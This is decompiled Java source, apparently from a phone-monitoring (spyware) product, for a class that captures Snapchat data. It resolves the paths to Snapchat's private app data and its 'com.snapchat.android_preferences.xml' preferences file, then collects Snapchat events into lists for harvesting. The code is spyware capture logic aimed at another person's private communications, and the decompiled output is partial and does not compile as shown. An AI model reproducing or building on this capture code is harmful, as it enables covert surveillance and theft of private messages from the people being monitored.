package com.vvt.capture.snapchat.b;

import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.capture.snapchat.c;
import com.vvt.capture.snapchat.d;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class g
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private String d;
  private com.vvt.base.b e;
  private long f = -1;
  
  public g(String paramString, com.vvt.base.b paramb)
  {
    this.d = paramString;
    this.e = paramb;
  }
  
  public com.vvt.base.capture.g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    long l = -1;
    try
    {
      localObject1 = d.a();
      boolean bool2 = com.vvt.ag.b.a((String)localObject1);
      if (!bool2)
      {
        String str2 = this.d;
        Object localObject2 = this.e;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        Object localObject3 = this.e;
        localObject3 = ((com.vvt.base.b)localObject3).g();
        localObject1 = d.a((String)localObject1, str2, (String)localObject2, (String)localObject3);
        bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2)
        {
          bool2 = c.b((String)localObject1);
          l = com.vvt.capture.snapchat.b.a((String)localObject1, bool2);
        }
      }
      localObject1 = this.d;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        Long localLong;
        boolean bool3 = c;
        if (bool3) {}
        String str1 = this.d;
      }
    }
    finally
    {
      d.b(this.d);
    }
    d.b((String)localObject1);
    localObject1 = new com/vvt/base/capture/FxSimpleEventReference;
    ((FxSimpleEventReference)localObject1).<init>();
    localLong = Long.valueOf(l);
    ((FxSimpleEventReference)localObject1).setReference(localLong);
    bool1 = a;
    if (bool1) {}
    return (com.vvt.base.capture.g)localObject1;
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = d.a();
      boolean bool2 = com.vvt.ag.b.a((String)localObject1);
      if (!bool2)
      {
        String str1 = this.d;
        Object localObject2 = this.e;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        Object localObject3 = this.e;
        localObject3 = ((com.vvt.base.b)localObject3).g();
        str1 = d.a((String)localObject1, str1, (String)localObject2, (String)localObject3);
        localObject1 = "shared_prefs";
        localObject2 = "com.snapchat.android_preferences.xml";
        localObject1 = d.a((String)localObject1, (String)localObject2);
        localObject2 = this.d;
        localObject3 = this.e;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        Object localObject4 = this.e;
        localObject4 = ((com.vvt.base.b)localObject4).g();
        String str2 = d.a((String)localObject1, (String)localObject2, (String)localObject3, (String)localObject4);
        bool1 = com.vvt.ag.b.a(str1);
        if (!bool1)
        {
          bool1 = c.b(str1);
          long l1 = com.vvt.capture.snapchat.b.a(str1, bool1);
          long l2 = 0L;
          localObject1 = this.d;
          com.vvt.base.b localb = this.e;
          localObject1 = com.vvt.capture.snapchat.b.a((String)localObject1, str1, l2, l1, localb, str2, paramInt);
          localArrayList.addAll((Collection)localObject1);
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public List a(com.vvt.base.capture.g paramg1, com.vvt.base.capture.g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      localObject1 = paramg1.getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = paramg2.getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = d.a();
      if (localObject1 != null)
      {
        String str2 = this.d;
        Object localObject3 = this.e;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        Object localObject4 = this.e;
        localObject4 = ((com.vvt.base.b)localObject4).g();
        str2 = d.a((String)localObject1, str2, (String)localObject3, (String)localObject4);
        localObject1 = "shared_prefs";
        localObject3 = "com.snapchat.android_preferences.xml";
        localObject1 = d.a((String)localObject1, (String)localObject3);
        localObject3 = this.d;
        localObject4 = this.e;
        localObject4 = ((com.vvt.base.b)localObject4).f();
        Object localObject5 = this.e;
        localObject5 = ((com.vvt.base.b)localObject5).g();
        localObject4 = d.a((String)localObject1, (String)localObject3, (String)localObject4, (String)localObject5);
        bool = com.vvt.ag.b.a(str2);
        if (!bool)
        {
          localObject1 = this.d;
          localObject3 = this.e;
          localObject1 = com.vvt.capture.snapchat.b.a((String)localObject1, str2, l1, l2, (com.vvt.base.b)localObject3, (String)localObject4);
          localArrayList.addAll((Collection)localObject1);
        }
      }
      localObject1 = this.d;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        bool = c;
        if (bool) {}
        String str1 = this.d;
      }
    }
    finally
    {
      d.b(this.d);
    }
    d.b((String)localObject1);
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/removeFromPath/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */